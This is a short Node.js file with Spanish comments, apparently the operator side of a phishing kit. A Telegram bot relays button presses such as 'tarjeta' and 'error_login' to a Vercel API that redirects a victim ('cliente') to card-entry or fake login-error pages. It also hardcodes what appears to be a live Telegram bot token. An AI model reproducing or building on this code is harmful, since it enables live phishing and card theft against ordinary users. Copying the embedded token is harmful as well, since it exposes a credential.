// bot.js
const axios = require('axios');

const TOKEN = "7504360348:AAHwDzXqkikSstpzhuk_R9uMg3XljWTqGM4";
const URL_API = `https://api.telegram.org/bot${TOKEN}`;

// ⚠️ REEMPLAZA CON LA URL DE TU PROYECTO DE VERCEL:
const URL_VERCEL_PROYECTO = "https://pacid-x3fc.vercel.app/"; 

async function procesarBoton(callbackQuery) {
    const data = callbackQuery.data; // 'tarjeta', 'error_login', etc.
    const chatId = callbackQuery.message.chat.id;

    try {
        // Enviamos la orden de forma segura a nuestra API de Vercel (api/send)
        await axios.post(`${URL_VERCEL_PROYECTO}/api/send`, { action: data });

        // Le avisamos a Telegram que la orden fue procesada con éxito
        await axios.post(`${URL_API}/answerCallbackQuery`, {
            callback_query_id: callbackQuery.id,
            text: `Orden enviada: ${data.toUpperCase()}`
        });

        await axios.post(`${URL_API}/sendMessage`, {
            chat_id: chatId,
            text: `🎯 *Comando ejecutado:* Redirigiendo al cliente a: \`${data}\``,
            parse_mode: 'Markdown'
        });
    } catch (e) {
        console.error("Error enviando acción a la API de Vercel:", e);
    }
}
